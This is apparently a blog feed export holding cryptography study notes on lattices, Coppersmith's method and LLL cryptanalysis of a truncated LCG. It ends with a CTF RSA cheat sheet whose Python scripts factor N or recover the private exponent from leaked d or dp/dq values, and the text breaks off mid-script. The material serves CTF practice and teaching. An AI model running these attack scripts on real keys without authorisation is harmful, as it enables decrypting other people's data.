title="4.4.2    Factoring N = pq with Partial Knowledge of p"></a>4.4.2    Factoring N = pq with Partial Knowledge of p</h4><p>Given an approximation $\tilde{p}$ to p such that $p=\tilde{p}+x_{0}$ where $|x_{0}|&lt;X$. The polynomial $F(x)=(x+\tilde{p})$ has a small solution module p. The problem is that we don’t know p, but we do know a multiple of p (i.e., N). The idea is to form a lattice corresponding to polynomials that have a small root modulo p and to apply Coppersmith’s method to find this root $x_0$.</p><p><strong>Theorem 4.4.1.</strong> Let N=pq with p&lt;q&lt;2p. Let $0&lt;\epsilon &lt;\frac{1}{4}$, and suppose $\tilde{p}\in N$ is such that $|p-\tilde{p}|\leq \frac{1}{2\sqrt{2}}N^{\frac{1}{4}-\epsilon}$. Then given N and $\tilde{p}$ one can factor N in time polynomial in log(N) and $\frac{1}{\epsilon}$.</p><p>By constructing lattice whose basis including $NX^{i},X^{i}F(X)$.</p><h4 id="4-4-3-Factoring-p-r-q"><a href="#4-4-3-Factoring-p-r-q" class="headerlink" title="4.4.3    Factoring $p^{r}q$"></a>4.4.3    Factoring $p^{r}q$</h4><p><strong>Example 4.4.2. (Takagi-RSA)</strong> Let $N=p^{r}q$ where p and q are primes and r&gt;1. Suppose the public exponent e in RSA is small. One can compute $c^{d}(mod\ N)$ as follows. Let $d_{p}\equiv d(mod\ p-1)$ and $d_{q}\equiv d(mod\ q-1)$. One first computes $m_{p}=c^{d_{p}}(mod\ p)$ and $m_{q}=c^{d_{q}}(mod\ q)$.</p><p>Then we can determine $m(mod\ p^{r})$ from $m_p$ by using Hensel lifting. If we have determined $m_{i}\equiv m    (mod\ p^{i})$ then we lift to a solution modulo $p^{i+1}$ by writing $m_{i+1}=m_{i}+kp^{i}$, where k is a variable. Then</p><script type="math/tex; mode=display">m_{i+1}^{e}=(m_{i}+kp^{i})^{e}\equiv m_{i}^{e}+ekp^{i}m_{i}^{e-1}\equiv c(mod\ p^{i+1})</script><p>gives $k\ mod(p^{i+1})$. The equation above is only efficient when e is small. If e is large then the Hensel lifting stage is no faster than just computing $c^{d(mod\ \varphi(p^{r}))}(mod\ p^{r})$ directly.</p><p>Coppersmith’s method can be used to factor integers of the form $N=p^{r}q$ when r is large. If one knows r and an approximation $\tilde{p}$ to p then there is a small root of the polynomial equation</p><script type="math/tex; mode=display">F(x)=(\tilde{p}+x)^{r}\equiv 0(mod\ p^{r})</script><p>It is shown that if $r\geq log(p)$ then the algorithm runs in polynomial-time.</p></c_{1}(d)\cdot></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lattice-Learning-1</title>
      <link href="/2020/02/29/Lattice-Learning-1/"/>
      <url>/2020/02/29/Lattice-Learning-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Chapter-1-Lattice"><a href="#Chapter-1-Lattice" class="headerlink" title="Chapter 1    Lattice"></a>Chapter 1    Lattice</h2><h3 id="1-1-Basic-Notions-on-Lattices"><a href="#1-1-Basic-Notions-on-Lattices" class="headerlink" title="1.1    Basic Notions on Lattices"></a>1.1    Basic Notions on Lattices</h3><p><strong>Definition 1.1.1.</strong> Let $\{\underline{b}_{1},…,\underline{b}_{n}\}$ be a linearly independent set of (row) vectors in $R^{m}(m\geq n)$. The lattice generated by $\{\underline{b}_{1},…,\underline{b}_{n}\}$ is the set</p><script type="math/tex; mode=display">L=\{\sum^{n}_{i=1}l_{i}\underline{b}_{i}:l_{i}\in Z\}</script><p>of integer linear combinations of the $\underline{b}_{i}$. The vectors $\{\underline{b}_{1},…,\underline{b}_{n}\}$ are called a lattice basis. The lattice rank is n and the lattice dimension is m. If n = m then L is said to be a full rank lattice.</p><p><strong>Lemma 1.1.2.</strong> Two $a\times b$ matrices B and B’ generate the same lattice L if and only if B and B’ are related by a unimodular matrix, i.e., $B’=UB$ where U is an $n\times n$ matrix with integer entries and determinant ±1.</p><p><strong>Definition 1.1.3.</strong> Let L be a lattice in $R^{m}$ of rank n with basis matrix B. The <strong>Gram matrix</strong> of B is $BB^{T}$. This is an $n\times n$ matrix whose (i, j)th entry is $&lt;\underline{b}_{i},\underline{b}_{j}&gt;$.</p><p><strong>Lemma 1.1.4.</strong> Let L be a lattice in $R^{m}$ of rank n with basis matrix B. Then $det(L)=\sqrt{det(BB^{T})}$</p><p><strong>Definition 1.1.5.</strong> Let $L\subset R^{m}$ be a lattice of rank n. The <strong>successive minima</strong> of L are $\lambda_{1},…,\lambda_{n}\in R$ such that, for $1\leq i\leq n,\lambda_{i}$ is minimal such that there exist i linearly independent vectors $\underline{v}_{1},…,\underline{v}_{i}\in L$ with $\left|\underline{v}_{j}\right|\leq \lambda_{i}$ for $1\leq j\leq i$.It follows that $0&lt;\lambda_{1}&lt;\lambda_{2}&lt;…&lt;\lambda_{n}$. Sometimes there exists a basis consisting of vectors whose lengths are equal to the successive minima, but not always.</p><h3 id="1-2-The-Hermite-and-Minkowski-Bounds"><a href="#1-2-The-Hermite-and-Minkowski-Bounds" class="headerlink" title="1.2    The Hermite and Minkowski Bounds"></a>1.2    The Hermite and Minkowski Bounds</h3><p><strong>Theorem 1.2.1.</strong> (Minkowski) Let L be a lattice of rank n in $R^{n}$ with successive minima $\lambda_{1},…,\lambda_{n}$ for the Euclidean norm. Then</p><script type="math/tex; mode=display">(\prod^{n}_{i=1}\lambda_{i})^{\frac{1}{n}}<\sqrt{n}det(L)^{\frac{1}{n}}</script><h3 id="1-3-Computational-Problems-in-Lattices"><a href="#1-3-Computational-Problems-in-Lattices" class="headerlink" title="1.3    Computational Problems in Lattices"></a>1.3    Computational Problems in Lattices</h3><p><strong>Definition 1.3.1.</strong> Let L be a lattice in $Z^{m}$</p><ol><li>The shortest vector problem (SVP) is the computational problem: given a basis matrix B for L, compute a non-zero vector $\underline{v}\in L$ such that $\left|\underline{v}\right|$ is minimal (i.e., $\left|\underline{v}\right|=\lambda_{1}$).</li><li>The closest vector problem (CVP) is the computational problem: given a basis matrix B for L and a vector $\underline{\omega}\in Q^{m}$ (one can work with high-precision approximations in $R^{m}$, but this is essentially still working in $Q^{m}$), compute $\underline{v}\in L$ such that $\left|\underline{\omega}-\underline{v}\right|$ is minimal.</li><li>Others</li></ol><h2 id="Chapter-2-Lattice-Basis-Reduction"><a href="#Chapter-2-Lattice-Basis-Reduction" class="headerlink" title="Chapter 2    Lattice Basis Reduction"></a>Chapter 2    Lattice Basis Reduction</h2><h3 id="2-1-LLL-Reduced-Lattice-Bases"><a href="#2-1-LLL-Reduced-Lattice-Bases" class="headerlink" title="2.1    LLL-Reduced Lattice Bases"></a>2.1    LLL-Reduced Lattice Bases</h3><blockquote><p><strong>The Goal of Lattice Reduction</strong></p><p>Obtain a basis B in which the Gram-Schmidt vectors are not decreasing too quickly.</p><p>This roughly means that the basis vectors are somewhat orthogonal to each other.</p></blockquote><p><strong>Definition 2.1.1.</strong> Let $\{\underline{b}_{1},…,\underline{b}_{n}\}$ be linearly independent in $R^{m}$ and let $\{\tilde{\underline{b}_{1}},…,\tilde{\underline{b}_{n}\}}$ be the Gram-Schmidt orthogonalisation. Let $\mu_{i,j}=\frac{&lt;\underline{b}_{i},\tilde{\underline{b}_{j}}&gt;}{\left|\tilde{\underline{b}_{j}}\right|^{2}}$ for $1\leq j&lt;i\leq n$ be the coefficients from the Gram-Schmidt process. Fix $\frac{1}{4}&lt;\delta&lt;1$. The (ordered) basis is <strong>LLL-Reduced</strong> (with factor $\delta$) if the following conditions hold:</p><ul><li>(Size reduced) All $|\mu_{i,j}|\leq 0.5$.</li><li>(Lov´asz condition) $(\delta-\mu_{i+1,i}^{2})\left|\tilde{\underline{b}_{i}}\right|^{2}\leq \left|\tilde{\underline{b}_{i+1}}\right|^{2}$ (It is traditional to choose $\delta=\frac{3}{4}$ in this case).</li></ul><script type="math/tex; mode=display">B=\left[ \begin{matrix}   1 & 0 & ... & ... & 0 \\   \mu_{2,1} & 1 & 0 & ... & 0 \\   \mu_{3,1} & \mu_{3,2} & 1 & ... & 0 \\   ... & ... & ... & ... & ... \\   0 & 0 & 0 & ... & 1  \end{matrix} \right]\left[ \begin{matrix}   \tilde{\underline{b}_{1}} \\   \tilde{\underline{b}_{2}} \\   ... \\   ... \\   \tilde{\underline{b}_{n}}  \end{matrix} \right]</script><p>Size reduced can be easily solved by Gauss elimination method while Lov´asz condition by swap $b_{i}$ and $b_{j}$.</p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-1/image-20200227233301471.png" alt></p><h3 id="2-2-Generic-Problems-that-Fall-under-the-Scope-of-Lattice-Reduction"><a href="#2-2-Generic-Problems-that-Fall-under-the-Scope-of-Lattice-Reduction" class="headerlink" title="2.2    Generic Problems that Fall under the Scope of Lattice Reduction"></a>2.2    Generic Problems that Fall under the Scope of Lattice Reduction</h3><h4 id="2-2-1-Pre-knowledge"><a href="#2-2-1-Pre-knowledge" class="headerlink" title="2.2.1    Pre-knowledge"></a>2.2.1    Pre-knowledge</h4><p><strong>Lemma 2.2.1.</strong>  Assume $\{\underline{b}_{1},…,\underline{b}_{n}\}$ is a family of vectors with integer coefficients <em>in the</em> t-dimensional space, with t&lt;n. Let M denote an upper bound for the absolute values of all coefficients of the various $\underline{b}_{i}s$. There exists an integer relation</p><script type="math/tex; mode=display">\sum_{i=1}^{n}\lambda_{i}\underline{b}_{i}=0</script><p>such that $max|\lambda_{i}|\leq B$，where B is given by</p><script type="math/tex; mode=display">logB=t\frac{logM+logn+1}{n-t}</script><h4 id="2-2-2-Ordinary-Case"><a href="#2-2-2-Ordinary-Case" class="headerlink" title="2.2.2    Ordinary Case"></a>2.2.2    Ordinary Case</h4><p>Given a family of integer vectors $\{\underline{b}_{1},…,\underline{b}_{n}\}$, there exists an integer relation</p><script type="math/tex; mode=display">\sum_{i=1}^{n}\alpha_{i}\underline{b}_{i}=0</script><p>We construct the lattice given by the rows of the following matrix:</p><script type="math/tex; mode=display">\left[  \begin{matrix}  K\underline{b}_{1} & 1 & 0 & ... & 0\\  K\underline{b}_{2} & 0 & 1 & ... & 0\\  ... & ... & ... & ... & ...\\  K\underline{b}_{n} & 0 & 0 & ... & 1  \end{matrix}\right]</script><p>where K is a well chosen constant.</p><p>K should be large enough to ensure that the first vector of the reduced basis has zero components in its upper part corresponding to the first t coordinates, where t is the dimension of the $\underline{b}_{i}$.</p><h4 id="2-2-3-Modular-Case"><a href="#2-2-3-Modular-Case" class="headerlink" title="2.2.3    Modular Case"></a>2.2.3    Modular Case</h4><p>We now discuss the case of <strong>mod m</strong> numbers. The basic problem is still how one can force lattice reduction to deal with modular relations. The matrix we construct is:</p><script type="math/tex; mode=display">\left[  \begin{matrix}  K\underline{b}_{1} & 1 & 0 & ... & 0\\  K\underline{b}_{2} & 0 & 1 & ... & 0\\  ... & ... & ... & ... & ...\\  K\underline{b}_{n} & 0 & 0 & ... & 1\\  KmI & 0 & 0 & ... & 0  \end{matrix}\right]</script><p>where I is a t-dimensional <strong>identity matrix</strong>, with t the dimension of the $\underline{b}_{i}$. It is clear that the added identity matrix force reduction of numbers module m.</p><h4 id="2-2-4-Knapsack-problems"><a href="#2-2-4-Knapsack-problems" class="headerlink" title="2.2.4     Knapsack problems"></a>2.2.4     Knapsack problems</h4><p>In cryptographic scenarios, we know that such a relation exists between the given elements of the knapsack $a_{1}, …, a_{n}$ and the target sum $s=\sum^{n}_{i=1}\epsilon_{i}a_{i}.(\epsilon_{i}\in\{0,1\})$</p><p>The euclidean size of this relation is $\sqrt{\alpha n }$, where $\alpha$ is the proportion of ones in the relations. Moreover, $\{\epsilon_{i}\}$ can be seen as random, so we will set $\alpha=\frac{1}{2}$ here.</p><p>Subset sum problem can be converted into SVP and easily solved by LLL algorithm with the following matrix:</p><script type="math/tex; mode=display">\left[\begin{matrix}Ka_{1} & 1 & 0 & ... & 0\\Ka_{2} & 0 & 1 & ... & 0\\... & ... & ... & ... & ...\\Ka_{n} & 0 & 0 & ... & 1\\Kc & \frac{1}{2} & \frac{1}{2} & ... & \frac{1}{2}\\\end{matrix}\right]</script><p>The reason for using $\frac{1}{2}$ rather than 0 in the last row vector, is that we want the correct vector to be as short as possible so that we can find it by solving SVP. </p><p>But the density of the knapsack should be low enough:</p><script type="math/tex; mode=display">d=\frac{n}{log_{2}(max_{i}a_{i})}.</script><p>It is said that “almost all” subset sum problems with d(a)&lt;0.645 can be solved as SVP by LLL algorithm, but the difficulty of solving is also related to size of n.</p><h3 id="2-3-Examples"><a href="#2-3-Examples" class="headerlink" title="2.3    Examples"></a>2.3    Examples</h3><h4 id="2-3-1-Cryptanalysis-of-Knuth’s-truncated-LCG"><a href="#2-3-1-Cryptanalysis-of-Knuth’s-truncated-LCG" class="headerlink" title="2.3.1    Cryptanalysis of Knuth’s truncated LCG"></a>2.3.1    Cryptanalysis of Knuth’s truncated LCG</h4><p>LCG is defined by $x_{i+1}=(ax_{i}+b)$ mod m.</p><p>In case all the bits of the successive $x_{i}s$ are announced, the sequence becomes exactly predictable even if the modulus, the multiplier and the increment are not known. This is a result of J. Boyar.</p><p>The version we introduce(Knuth) extends the initial method to the case where a small portion of the lower bits are discarded. Moreover, our results cover the case where <em>m</em> and <em>a</em> are unknown parameters.</p><p><strong>First step of the algorithm</strong></p><p>We let $\nu$ be the number of bits of the modules m. If we output a proportion $\alpha$ of bits, we can write</p><script type="math/tex; mode=display">x_{i}=2^{\beta\nu}y_{i}+z_{i}</script><p>where $\beta=1-\alpha,y_{i}$ consists of the leading bits of $x_{i}$ and $z_{i}$ of the trailing bits.</p><p>Our algorithm is more accurately described as a sequence of different algorithms depending on a parameter <em>t</em>.</p><p>We let $V_{i}$ be the element of $Z^{t}$ defined by</p><script type="math/tex; mode=display">V_{i}=(y_{i+1}-y_{i},y_{i+2}-y_{i+1},...,y_{i+t}-y_{i+t-1})</script><p>Applying the techniques of  section 2.2.2, we can find an linear relation</p><script type="math/tex; mode=display">\sum^{n}_{i=1}\lambda_{i}V_{i}=0</script><p>whose coefficients are moderate integers. More precisely, it follows from lemma 2.2.1 that such a relation exists with $|\lambda_{i}|\leq B$ with</p><script type="math/tex; mode=display">logB=t\frac{log(2^{\alpha\nu})+logn+1}{n-t}=t\frac{\alpha\nu+logn+1}{n-t}</script><p>We now consider the (unknown) vectors $W_{i}$ defined by</p><script type="math/tex; mode=display">W_{i}=(x_{i+1}-x_{i},x_{i+2}-x_{i+1},...,x_{i+t}-x_{i+t-1})</script><p>and we let</p><script type="math/tex; mode=display">U=\sum^{n}_{i=1}\lambda_{i}W_{i}</script><p>$\because x_{i+j+1}-x_{i+j}=a^{j}(x_{i+1}-x_{i})\ mod\ m$，$\therefore$ all vectors $W_{i}s$ belong to the lattice L generated by the rows of the following matrix</p><script type="math/tex; mode=display">\left[\begin{matrix}1 & a & a^{2} & ... & a^{t-1}\\0 & m & 0 & ... & 0\\0 & 0 & m & ... & 0\\... & ... & ... & ... & ...\\0 & 0 & 0 & ... & m\end{matrix}\right]</script><p>It is easily seen that $det(L)=m^{t-1}$，hence the expected size of short vectors is around $tm^{\frac{t-1}{t}}$(Minkowski Theorem). Since U belongs to L and is of size $O(m^{\beta+\delta})$, for any $\delta&gt;0$, (can be easily proved by $\sum^{n}_{i=1}\lambda_{i}V_{i}=0$), U is unusually short as soon as $\beta&lt;\frac{t-1}{t}$, which means $\alpha&gt;\frac{1}{t}$. Such a vector has to be <strong>zero</strong>. ($\lambda_{i}s$ were produced by $V_{i}s$ and LLL algorithm) </p><p>Now we have U=0, and we can write U as</p><script type="math/tex; mode=display">\sum^{n}_{i=1}\lambda_{i}W_{i}=(x_{1}-x_{0})\sum^{n}_{i=1}\lambda_{i}a^{i}\ mod\ m</script><p>As soon as $x_{1}-x_{0}$ is prime to m(unless $x_{0}$ is a bad seed), we get the polynomial $P(x)=\sum\lambda_{i}x^{i}$ vanishes at a module m. This is precisely what we want from the first step.</p><p><strong>Second step of the algorithm</strong></p><p>After applying part 1 several times, we come out with a sequence $P_{1},…,P_{r}$ of polynomials of degree n, each of these vanishing at a module m. Now, if we identify polynomials of degree n with elements of $Z^{n+1}$(by coefficients), we see that the polynomials that <strong>vanish at a module m</strong> form a lattice L generated by the sequence</p><script type="math/tex; mode=display">Q_{i}(x)=x^{i}-a^{i}(1\leq i\leq n)</script><p>which all vanish at a module m and by the constant polynomial m. The basis s generated by the row vectors below</p><script type="math/tex; mode=display">\left[\begin{matrix}m & 0 & 0 & ... & 0\\-a & 1 & 0 & ... & 0\\-a^{2} & 0 & 1 & ... & 0\\... & ... & ... & ... & ...\\-a^{n} & 0 & 0 & ... & 1\end{matrix}\right]</script><p>which $det(L)=m$. Now, if the $P_{i}s$ generate the lattice, then one can apply lattice reduction, output a basis of the lattice and <strong>compute the determinant</strong>. Based on experiments, we claim that such an algorithm actually discloses m. </p><p><img src= "/img/loading.gif" data-src="/2020/02/29/Lattice-Learning-1/Snipaste_2020-04-08_23-23-15.png" alt></p><p>We finally say a word on recovering a from m. We twist the lattice L generated by $P_{i}s$ and constant m by multiplying all coefficients of $degree\geq 2$ by a large constant K and we apply lattice reduction. We usually let $K\geq m2^\frac{n}{2}$, then the sublattice of L generated by m and x-a will be disclosed: this is because the shortest two vectors of L is of size m and any polynomial of the lattice with $degree\geq 2$ exceeds this size by a factor $\geq 2^{\frac{n}{2}}$. So we can solve polynomial with $degree\leq 2$ to get a. </p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary of Crypto in CTF(RSA)</title>
      <link href="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/"/>
      <url>/2020/02/28/Summary-of-Crypto-in-CTF-RSA/</url>
      
        <content type="html"><![CDATA[<h3 id="RSA-How-to-Use-openssl"><a href="#RSA-How-to-Use-openssl" class="headerlink" title="RSA - How to Use openssl"></a>RSA - How to Use openssl</h3><p>Given <em>flag.enc</em>, <em>pubkey.pem/pub.key</em></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</span><br></pre></td></tr></table></figure><p>Then we get (e, n), after getting d: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line">c = bytes_to_long(open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>).read())</span><br><span class="line">print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="RSA-Given-e-d-n"><a href="#RSA-Given-e-d-n" class="headerlink" title="RSA - Given (e, d, (n))"></a>RSA - Given (e, d, (n))</h3><h4 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h4><ol><li>[Initialize] Set $k\leftarrow d\cdot e-1$</li><li>[Try a random g] Choose random small primes g = 2, 3, 5, 7, …</li><li>[Next k] If $2\mid k,k\leftarrow\frac{k}{2}$ and $x\leftarrow g^k$ mod n, else go to step 2 (g $\leftarrow$ next_prime(g))</li><li>[Finish?] If $y\leftarrow gcd(x-1,n)\ mod\ n&gt;1,p\leftarrow y,q\leftarrow n//y$, quit. Else go to step 3.</li></ol><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Factorize</span><span class="params">(n, e, d)</span>:</span></span><br><span class="line">    g = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = e * d - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> k &amp; <span class="number">1</span>:</span><br><span class="line">            k //= <span class="number">2</span></span><br><span class="line">            p = int(gcd(pow(g, k, n) - <span class="number">1</span>, n)) % n</span><br><span class="line">            <span class="keyword">if</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">        g = int(next_prime(g))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    d = </span><br><span class="line">    print(Factorize(n, e, d))</span><br></pre></td></tr></table></figure><h4 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h4><p>Given only (e, d)  - [NCTF2019] babyRSA</p><h3 id="RSA-Given-e-dp-n"><a href="#RSA-Given-e-dp-n" class="headerlink" title="RSA - Given (e, dp, n)"></a>RSA - Given (e, dp, n)</h3><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem"></a>Theorem</h4><script type="math/tex; mode=display">Known(e,dp,n),assume\ dp\equiv d(mod\ (p-1))</script><hr><p>$\because dp\cdot e\equiv d\cdot e\equiv 1(mod\ (p-1))$</p><p>$\therefore dp\cdot e-1=k\cdot (p-1)$</p><p>$\because dp\cdot e\equiv d\cdot e\equiv 1(mod\ (p-1))$</p><p>$\therefore dp\cdot e-1=k\cdot (p-1)$</p><p>$\therefore (dp\cdot e-1)\cdot d\cdot e=k’\cdot (p-1),\quad k’=k\cdot d\cdot e$</p><p>$\Leftrightarrow d*e=-k’\cdot (p-1)+dp\cdot e\cdot d\cdot e\equiv 1(mod\ \varphi(n))\Leftrightarrow -k’\cdot (p-1)+dp\cdot e\equiv 1(mod\ \varphi(n))$</p><p>$\therefore k_{1}\cdot (p-1)+dp\cdot e-1=k_{2}\cdot (p-1)\cdot (q-1)\Leftrightarrow (p-1)\cdot (k_{2}\cdot (q-1)-k_{1})+1=dp\cdot e$</p><p>$\because dp&lt;p-1\quad \therefore (k_{2}\cdot (q-1)-k_{1})\in (0, e)$</p><p>$\therefore$遍历i in range(1, e)，当同时满足</p><p>$(dp\cdot e-1)\%i==0$和$n\%((dp\cdot e-1)//i+1)==0时$，N成功分解.</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(e, dp, n)</span>:</span></span><br><span class="line">    _ = dp * e - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _ % i:</span><br><span class="line">            p = _ // i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> n % p:</span><br><span class="line">                q = n // p</span><br><span class="line">                phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                d = int(gmpy2.invert(e, phi))</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    e = int(input(<span class="string">"e = "</span>))</span><br><span class="line">    dp = int(input(<span class="string">"dp = "</span>))</span><br><span class="line">    n = int(input(<span class="string">"n = "</span>))</span><br><span class="line">    c = int(input(<span class="string">"c = "</span>))</span><br><span class="line">    d = decrypt(e, dp, n)</span><br><span class="line">    print(long_to_bytes(pow(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="RSA-Given-p-q-dp-dq"><a href="#RSA-Given-p-q-dp-dq" class="headerlink" title="RSA - Given (p, q, dp, dq)"></a>RSA - Given (p, q, dp, dq)</h3><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem"></a>Theorem</h4><script type="math/tex; mode=display">Known(p,q,dp,dq),assume\ dp\equiv d(mod\ (p-1)),dq\equiv d(mod\ (q-1))</script><hr><p>$d\equiv dp(mod\ (p-1)),d\equiv dq(mod\ (q-1))\rightarrow ext_CRT\ (\because gcd(p-1,q-1)$不一定等于1)</p><p>$\because d=k_{1}(p-1)+dp=k_{2}(q-1)+dq\Leftrightarrow k_{1}(p-1)=(dq-dp)+k_{2}(q-1)$</p><p>$\Leftrightarrow k_{1}\frac{p-1}{gcd(p-1,q-1)}=\frac{dq-dp}{gcd(p-1,q-1)}+k_{2}\frac{q-1}{gcd(p-1,q-1)}$</p><p>$\Rightarrow k_{1}\frac{p-1}{gcd(p-1,q-1)}\equiv\frac{dq-dp}{gcd(p-1,q-1)}(mod\ \frac{q-1}{gcd(p-1,q-1)})$</p><p>$\Leftrightarrow k_{1}\equiv invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{dq-dp}{gcd(p-1,q-1)}(mod\ \frac{q-1}{gcd(p-1,q-1)})$</p><p>将$k_{1}=k_{3}\frac{q-1}{gcd(p-1,q-1)}+invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{dq-dp}{gcd(p-1,q-1)}$代入$d=k_{1}(p-1)+dp$</p><p>$d=k_{3}\frac{(p-1)(q-1)}{gcd(p-1,q-1)}+invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{(dq-dp)(p-1)}{gcd(p-1,q-1)}+dp$</p><p>$\Rightarrow d\equiv invert(\frac{p-1}{gcd(p-1,q-1)},\frac{q-1}{gcd(p-1,q-1)})\cdot \frac{(dq-dp)(p-1)}{gcd(p-1,q-1)}+dp(mod\ \frac{(p-1)(q-1)}{gcd(p-1,q-1)})$</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(p, q, dp, dq)</span>:</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    dd = int(gmpy2.gcd(p - <span class="number">1</span>, q - <span class="number">1</span>))</span><br><span class="line">    modules = phi // dd</span><br><span class="line">    d = int(gmpy2.invert((p - <span class="number">1</span>) // dd, (q - <span class="number">1</span>) // dd)) * \</span><br><span class="line">        (dq - dp) * (p - <span class="number">1</span>) // dd + dp</span><br><span class="line">    d %= modules</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(d, phi) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">        d += modules</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p = int(input(<span class="string">"p = "</span>))</span><br><span class="line">    q = int(input(<span class="string">"q = "</span>))</span><br><span class="line">    dp = int(input(<span class="string">"dp = "</span>))</span><br><span class="line">    dq = int(input(<span class="string">"dq = "</span>))</span><br><span class="line">    c = int(input(<span class="string">"c = "</span>))</span><br><span class="line">    d = decrypt(p, q, dp, dq)</span><br><span class="line">    plaintext = long_to_bytes(pow(c, d, p * q))</span><br><span class="line">    print(plaintext)</span><br></pre></td></tr></table></figure><h4 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = crt(dp, dq, p - <span class="number">1</span>, q - <span 